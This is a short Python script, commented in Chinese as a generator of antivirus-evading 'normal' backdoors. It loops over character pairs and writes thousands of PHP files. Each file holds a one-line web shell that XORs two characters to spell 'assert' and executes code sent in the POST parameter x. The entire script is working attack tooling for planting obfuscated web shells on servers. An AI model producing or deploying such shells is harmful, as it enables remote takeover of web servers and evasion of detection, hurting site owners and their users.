'''
    请求后门  测试payload是否成功  判断后门代码是否正常
    免杀的正常后门
'''

for i in range(1, 127):
    for j in range(1, 127):
        code = "'" + chr(i) + "'" + '^' + "'" + chr(j) + "'"
        bypass = "<?php $a= (" + code + ").'ssert';$a($_POST[x]);?>"
        file_path = 'E:/Sec/Tools/Mess/webshell/php异或生成后门/' + str(i) + '_' + str(j) + '.php'
        with open(file_path, 'a+') as f:
            f.write(bypass)
            print(bypass)
